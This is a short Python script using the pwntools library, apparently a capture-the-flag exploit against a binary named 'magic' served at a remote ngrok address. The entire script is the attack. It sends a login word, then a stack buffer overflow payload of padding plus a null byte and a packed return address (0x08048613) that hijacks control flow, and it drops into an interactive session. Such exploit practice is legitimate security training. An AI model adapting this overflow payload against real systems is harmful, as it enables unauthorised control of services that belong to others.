from pwn import *

context.log_level = 'debug'
#p = process('./magic')
p = remote('0.tcp.ngrok.io', 15027)
p.sendline('bread')
p.sendline('a'*19+'\0'+'a'*52+p32(0x08048613))
p.interactive()